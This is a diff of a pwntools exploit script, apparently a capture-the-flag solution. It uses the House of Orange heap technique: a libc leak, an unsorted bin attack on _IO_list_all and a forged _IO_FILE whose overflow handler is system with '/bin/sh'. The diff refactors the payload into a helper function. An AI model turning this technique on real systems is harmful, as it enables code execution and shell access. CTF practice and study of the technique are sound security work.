@@ -1,4 +1,5 @@
 from pwn import *
+from hog import hog
 
 context.log_level="debug"
 
@@ -41,7 +42,6 @@ upgrade_house(4000,payload,10,1)
 
 build_house(0x1000,10,10,1) ## call malloc : request > top chunk_size
 #####################
-pause()
 ###LEAK libc using main_arena + 88
 build_house(1100,'LEAK_ADD',10,1)
 see_the_house()
@@ -61,8 +61,10 @@ old_top_addr = u64(p.recv(6).ljust(8,'\x00'))
 log.info('old_top_addr : ' + hex(old_top_addr))
 ################
 
-pause()
 ###unsorted bin attack && write fake _IO_FILE
+start =  old_top_addr + 0x450 + 8 * 6
+log.info('fake struct start : ' + hex(start))
+
 payload = 'a' * 0x450
 
 payload += p64(0) ## next chunk : prev_size
@@ -70,18 +72,7 @@ payload += p64(33) ## next chunk : size
 payload += p64(0x1f0000000a) ##next chunk : content
 payload += p64(0) ##next chunk : content
 
-payload += '/bin/sh\x00' ##fake _IO_FILE start
-payload += p64(0x61) ## set size 0x61 to locate smallbin[4]
-payload += p64(libc + l.sym['__malloc_hook'] + 16 + 88) ## main_arena + 88
-payload += p64(libc + l.sym['_IO_list_all'] - 16) ## _IO_list_all -> main_arena + 88
-payload += p64(2) ## _IO_write_base
-payload += p64(3) ## _IO_write_ptr
-
-payload += p64(libc + l.sym['system']) ## _IO_OVERFLOW
-payload += 'a' * (0xc0 - 8 * 7)
-payload += p64(0) ## _mode
-payload += 'a' * (0xd8 - 0xc0 - 8)
-payload += p64(old_top_addr + 0x450 + 8 * 9) ## vtable
+payload += hog(libc+ l.sym['_IO_list_all'], start, libc + l.sym['system'])
 
 upgrade_house(0x1000,payload,10,1)
 #####################
